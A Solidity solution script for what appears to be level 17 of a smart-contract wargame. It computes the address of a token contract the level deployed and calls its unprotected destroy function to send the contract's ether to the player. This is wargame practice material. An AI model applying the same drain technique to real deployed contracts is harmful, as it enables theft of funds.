// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/ISimpleToken.sol";

contract SolveLevel17 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb;
        value = 0.001 ether;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        address simpleTokenAddress = computeCreateAddress(instanceAddress, 1);
        ISimpleToken(simpleTokenAddress).destroy(payable(player));
    }
}
